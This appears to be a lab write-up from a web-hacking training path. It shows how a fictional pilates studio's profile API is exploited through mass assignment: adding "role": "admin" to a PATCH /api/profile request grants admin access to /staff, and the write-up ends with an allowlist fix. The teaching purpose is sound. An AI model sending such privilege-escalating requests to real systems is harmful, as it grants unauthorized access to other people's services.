---

Name: Salt Brook Pilates
Difficulty: Easy
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/04/rider
Description: Salt Brook Pilates is a founder-led studio in the Hudson Valley running reformer classes out of two storefronts. Drop-ins are $32, monthly unlimited is $260, and the booking site was rewritten last spring by a small contract team. The new profile endpoint went live without a strong-params review, the form only ever submitted four fields, so nobody worried about what else the API would accept. 

---

## Initial Testing

After creating an account, I first considered whether I could simply add an administrative parameter during registration:

```text
display_name=bob&email=bob%40gmail.com&password=password&admin=True
```

I also tried:

```text
&role=admin
```

Neither worked.

## Inspecting the Profile Endpoint

After logging in, I found an option to edit my member details.

A normal profile update request was sent to:

```http
PATCH /api/profile
```

The JSON body contained only the fields normally used by the profile form:

```json
{
  "display_name": "bob",
  "phone": "1",
  "dietary_pref": "1",
  "emergency_contact": "1"
}
```

Since the description specifically mentioned that the API accepted fields beyond those submitted by the form, I tested whether I could add another property to the JSON request.

## Exploiting Mass Assignment

I added a `role` parameter:

```json
{
  "display_name": "bob",
  "phone": "1",
  "dietary_pref": "1",
  "emergency_contact": "1",
  "role": "admin"
}
```

The API accepted the additional parameter instead of rejecting it.

After the request completed, my account had been assigned the `admin` role.

I could then access the previously restricted:

```text
/staff
```

## Conclusion

The profile endpoint was vulnerable to **mass assignment** because it trusted user-supplied fields without restricting which properties could be modified.

The normal profile form only exposed four fields, but the API also accepted:

```json
"role": "admin"
```

By adding this field to the `PATCH /api/profile` request, I was able to change my account's role to `admin` and gain access to `/staff`.

The issue could be prevented by using an allowlist of permitted fields and rejecting sensitive properties such as `role` from user-controlled requests.
